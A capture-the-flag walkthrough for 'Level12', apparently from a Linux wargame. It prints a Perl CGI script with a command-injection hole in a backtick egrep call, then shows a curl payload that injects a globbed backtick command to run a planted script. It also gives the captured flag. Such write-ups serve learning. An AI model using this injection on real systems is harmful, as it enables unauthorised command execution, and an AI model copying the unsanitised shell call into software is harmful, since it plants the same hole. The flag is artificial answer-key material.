

# **Level12**

### **Walk through**

Doing `ls` we discover a perl script `level12`

`cat level12.pl`

```perl
#!/usr/bin/env perl
# This is a Perl CGI script that takes parameters from a CGI request.
# localhost:4646

use CGI qw{param};
print "Content-type: text/html\n\n";

# Function t takes two arguments, transforms the first one, and searches for a match in the file /tmp/xd.
sub t {
  $nn = $_[1];
  $xx = $_[0];

  # Transform xx to uppercase and remove spaces.
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;

  # Read lines from /tmp/xd that start with the transformed xx and contain nn.
  @output = `egrep "^$xx" /tmp/xd 2>&1`;

  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);

      # If the second part of the line matches nn, return 1.
      if($s =~ $nn) {
          return 1;
      }
  }

  # If no match is found, return 0.
  return 0;
}

# Function n prints dots or dots followed by two dots based on the input value.
sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

# Call n with the result of t(param("x"), param("y")).
n(t(param("x"), param("y")));

```

The idea is to give as input parameter 'x' a script that will be evaluated. Indeed the line ```@output = `egrep "^$xx" /tmp/xd 2>&1`;``` contains a vulnerability, if the x is not properly parsed/sanitize we can input a script that will be executed because of the back ticks. Moreover, as anything between the back ticks will be evaluated, giving as input something like /*/script.sh could match several files and thus run an exploit. Our a script will simply be:

`echo 'getflag > /tmp/flag12' > /tmp/GETFLAG`
`chmod +x /tmp/GETFLAG`

Let's curl the result:

```curl 127.0.0.1:4646?'x=`/*/GETFLAG`'``` which gives us the flag **g1qKMiRpXf53AWhDaU7FEkczr**.

If anything doesn't work as imagined we can always check the error.log of the server doing `cat /var/log/apache2/error.log`.

We will use it to log as level13

`su level13`
